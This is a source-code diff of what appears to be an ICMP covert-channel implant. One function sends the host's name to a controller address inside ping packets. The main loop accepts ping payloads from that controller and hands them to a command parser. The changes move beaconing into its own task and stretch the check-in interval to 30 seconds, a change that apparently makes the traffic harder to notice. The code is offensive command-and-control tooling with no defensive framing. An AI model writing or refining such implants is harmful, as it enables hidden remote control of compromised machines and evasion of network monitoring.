@@ -16,8 +16,6 @@
 #include <netinet/ip_icmp.h>
 #include <arpa/inet.h>
 
-static char hostname[256];
-
 static uint16_t checksum(void *vdata, size_t size)
 {
   uint8_t *data = (uint8_t *)vdata;
@@ -139,7 +137,7 @@ void beacon_task(const std::string &dst, const std::string &opt)
     std::string beacon = "(beacon) ";
     beacon.append(hostname);
     send_ping(sockfd, dst, (uint8_t *)beacon.c_str(), beacon.size() + 1);
-    usleep(5000000);
+    usleep(30000000);
   }
 }
 
@@ -276,19 +274,12 @@ int main(int argc, char **argv)
 
   // Start the listener loop.
   while (1) {
-    // Send a ICMP echo request.
-    std::string beacon = "(beacon) ";
-    beacon.append(hostname);
-    send_ping(sockfd, dest_ip, (uint8_t *)beacon.c_str(), beacon.size() + 1);
-
     uint8_t buf[1024];
     std::string src_ip;
     long nbytes = receive_ping(sockfd, src_ip, buf, sizeof(buf));
     if (src_ip == dest_ip) {
       parse_command(sockfd, dest_ip, buf, nbytes);
     }
-
-    usleep(100000);
   }
 
   return 0;
